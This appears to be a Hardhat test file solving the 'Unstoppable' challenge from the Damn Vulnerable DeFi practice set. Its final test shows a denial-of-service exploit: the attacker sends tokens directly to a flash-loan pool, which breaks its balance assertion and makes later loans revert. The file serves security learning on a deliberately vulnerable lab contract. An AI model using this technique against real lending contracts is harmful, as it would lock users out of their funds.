const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
const { expect } = require('chai');

describe("[Challenge] Unstoppable", function () {
  // Pool has 1M * 10**18 tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000")
  const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther("100")

  // Declare variables
  let ContractFactoryA;
  let ContractFactoryB;
  let ContractFactoryC;
  let DamnValuableToken;
  let ReceiverUnstoppable;
  let UnstoppableLender;
  let deployer;
  let attacker;
  let someUser;
  let otherAccounts;

  beforeEach(async function () {
    //Setup accounts and contracts
    [deployer, attacker, someUser, ...otherAccounts] = await ethers.getSigners();
    ContractFactoryA = await ethers.getContractFactory("DamnValuableToken");
    ContractFactoryB = await ethers.getContractFactory("UnstoppableLender");
    ContractFactoryC = await ethers.getContractFactory("ReceiverUnstoppable");
    DamnValuableToken = await ContractFactoryA.deploy();
    UnstoppableLender = await ContractFactoryB.deploy(DamnValuableToken.address);
    ReceiverUnstoppable = await ContractFactoryC.connect(someUser).deploy(UnstoppableLender.address);
    // this.token = DamnValuableToken
    // this.token = await DamnValuableToken.new({ from: deployer });

    // this.pool = UnstoppableLender
    // this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });

    await DamnValuableToken.approve(UnstoppableLender.address, TOKENS_IN_POOL.toString());
    // await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });

    await UnstoppableLender.depositTokens(TOKENS_IN_POOL.toString());
    // await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });

    await DamnValuableToken.transfer(attacker.address, INITIAL_ATTACKER_BALANCE.toString());
    // await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });

    await ReceiverUnstoppable.connect(someUser).executeFlashLoan(10)
    //await this.receiverContract.executeFlashLoan(10, { from: someUser });
  })

  // it("Minted DamnValuableToken to deployer", async function() {
  //   expect(await DamnValuableToken.balanceOf(deployer.address)).to.equal(ethers.constants.MaxUint256);
  // })

  it("1000000 tokens deposited in the pool", async function() {
    let bal = await DamnValuableToken.balanceOf(UnstoppableLender.address);
    let roundedbal = Math.round(ethers.utils.formatEther(bal));
    expect(roundedbal).to.equal(1000000);
  })

  it("100 tokens deposited in the attacker address", async function() {
    let bal = await DamnValuableToken.balanceOf(attacker.address);
    let roundedbal = Math.round(ethers.utils.formatEther(bal));
    expect(roundedbal).to.equal(100);
  })

  it("Unstoppable Lender initialised with correct DamnValuableToken address", async function() {
    expect(await UnstoppableLender.damnValuableToken()).to.equal(await DamnValuableToken.address);
  })

  it("Exploited!", async function() {
    // EXPLOIT LINE - If you transfer DVT tokens to UnstoppableLender directly, executeFlashLoan() will
    // revert at the line
    // assert(poolBalance == balanceBefore);
    await DamnValuableToken.connect(attacker).transfer(UnstoppableLender.address, 100);

    await expect(ReceiverUnstoppable.connect(someUser).executeFlashLoan(10)).to.be.reverted;
  })


  //UnstoppableLender.damnValuableToken()

})
